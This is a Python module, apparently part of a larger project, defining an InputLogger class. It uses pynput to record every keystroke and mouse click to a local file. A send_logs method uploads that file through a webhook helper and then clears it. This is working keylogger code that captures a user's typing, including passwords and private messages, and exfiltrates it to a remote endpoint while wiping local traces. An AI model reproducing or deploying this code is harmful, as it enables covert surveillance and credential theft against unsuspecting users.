from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import os

from utils.logging_utils import log_to_file, log_error, log_info
from utils.webhook_utils import send_log_file
from utils.file_utils import clear_log_file


class InputLogger:
    def __init__(self):
        self.log_file = "input.txt"
        self.running = True

    def log_keyboard_press(self, key):
        log_to_file(self.log_file, f"KEY PRESSED: {key}")
        return self.running

    def log_keyboard_release(self, key):
        log_to_file(self.log_file, f"KEY RELEASED: {key}")
        return self.running

    def log_mouse_click(self, x, y, button, pressed):
        action = "PRESSED" if pressed else "RELEASED"
        log_to_file(self.log_file, f"MOUSE {action} {str(button)} AT {x}, {y}")
        return self.running

    def log_input(self):
        with KeyboardListener(
            on_press=self.log_keyboard_press, on_release=self.log_keyboard_release
        ) as keyboard_listener, MouseListener(
            on_click=self.log_mouse_click
        ) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

    def send_logs(self):
        send_log_file(f"`Sending input logs...`", self.log_file)
        clear_log_file(self.log_file)
        log_info("Sent and cleared input log file.")

    def run(self):
        try:
            self.log_input()
        except Exception as e:
            self.running = False
            log_error(e)
